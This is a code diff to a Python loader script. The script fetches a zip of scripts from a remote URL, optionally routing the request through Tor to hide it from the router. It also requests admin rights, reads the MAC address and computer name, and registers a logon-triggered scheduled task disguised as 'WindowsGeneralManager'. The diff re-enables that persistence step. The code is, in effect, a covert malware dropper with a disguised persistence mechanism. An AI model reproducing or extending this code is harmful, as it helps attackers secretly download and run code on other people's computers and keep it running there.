@@ -1,4 +1,3 @@
-# the script that makes everything work
 import os # To interact with operating system
 import sys # To interact with operating system
 import ctypes # to get admin privileges
@@ -10,9 +9,12 @@ from getmac import get_mac_address # to get mac address
 from platform import node # to get computer name
 from time import sleep # for any delays
 
-URL = 'http://127.0.0.1:8000' # the url from which the zip containing the scripts will be downloaded
+
+#URL = 'http://127.0.0.1:8000' # the url from which the zip containing the scripts will be downloaded
+URL = 'http://10.0.2.2:8000'
 ZIP_NAME = 'scripts.zip' # what the name of the zip containing the scripts should be called
 TOR_INITIAL = True # whether the script should make the intial request through tor or the clearweb. Recommended True so you don't leak what you're doing to the router
+TIME = 1723820601 # the time that the started file will be set to verify it hasn't been changed
 TaskName = 'WindowsGeneralManager'
 scripts_file = '' # a file that is a list of all the scripts
 started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
@@ -23,9 +25,9 @@ pids = []
 platform = ''
 
 if 'win' in sys.platform:
-    platform += 'win'
+    platform = 'win'
 elif sys.platform == 'linux':
-    platform += 'linux'
+    platform = 'linux'
 
 
 def check_admin(win=False):
@@ -121,18 +123,13 @@ fr'''<?xml version="1.0" encoding="UTF-16"?>
     </Exec>
   </Actions>
 </Task>'''
-        XML_Logon = \
+        XML_LOGON = \
 fr'''<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
     <LogonTrigger>
       <Enabled>true</Enabled>
       <Delay>PT5S</Delay>
-      <Repetition>
-        <Interval>PT1M</Interval>
-        <Duration>PT24H</Duration>
-        <StopAtDurationEnd>false</StopAtDurationEnd>
-      </Repetition>
     </LogonTrigger>
   </Triggers>
   <Principals>
@@ -169,7 +166,7 @@ fr'''<?xml version="1.0" encoding="UTF-16"?>
   </Actions>
 </Task>'''
         with open(f"{TaskName}.xml", "w") as f:  # make the config file
-            f.write(XML_Logon)
+            f.write(XML_LOGON)
         # The command to register the task that will automatically rerun this script on every logon
         cmd = ['schtasks',  # Call task scheduler
                '/Create',  # Tell it you're trying to make a task
@@ -229,10 +226,10 @@ else:
     os.makedirs(scripts_direc, exist_ok=True)  # make the directory for the scripts that will be downloaded
     get_scripts()
     make_path_list()
-    # if '.py' in __file__:
-    #     make_renewable(True, platform)
-    # else:
-    #     make_renewable(False, platform)
+    if '.py' in __file__:
+        make_renewable(True, platform)
+    else:
+        make_renewable(False, platform)
 
     with open(started_file, 'w') as f: # open the started file to log that the scripts were downloaded
         f.close()
